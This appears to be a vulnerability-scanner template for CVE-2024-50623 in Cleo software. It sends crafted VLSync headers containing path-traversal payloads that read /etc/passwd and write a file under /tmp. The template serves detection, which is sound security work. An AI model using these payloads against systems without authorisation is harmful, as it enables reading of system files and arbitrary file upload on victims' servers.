id: CVE-2024-50623

info:
  name: Cleo Unrestricted File Upload and Download Vulnerability
  author: Sonny and Sina Kheirkhah (@SinSinology) of watchTowr
  severity: critical
  description: |
    Cleo systems are vulnerable to unrestricted file upload and download due to improper validation of user-supplied input in the VLSync header.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-50623
  tags: cve,cve2024,cleo,file-upload,file-download

requests:
  - method: GET
    path:
      - "{{BaseURL}}/Synchronization"

    headers:
      VLSync: "Retrieve;l=Ab1234-RQ0258;n=VLTrader;v=1.0;a=1337;po=1337;s=True;b=False;pp=1337;path=../../../../etc/passwd"

    matchers:
      - type: word
        words:
          - "root:x:0:0:root"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/Synchronization"

    headers:
      VLSync: "ADD;l=Ab1234-RQ0258;n=VLTrader;v=1.0;a=1337;po=1337;s=True;b=False;pp=1337;path=../../../../tmp/test.txt"

    body: "test"

    matchers:
      - type: status
        status:
          - 200
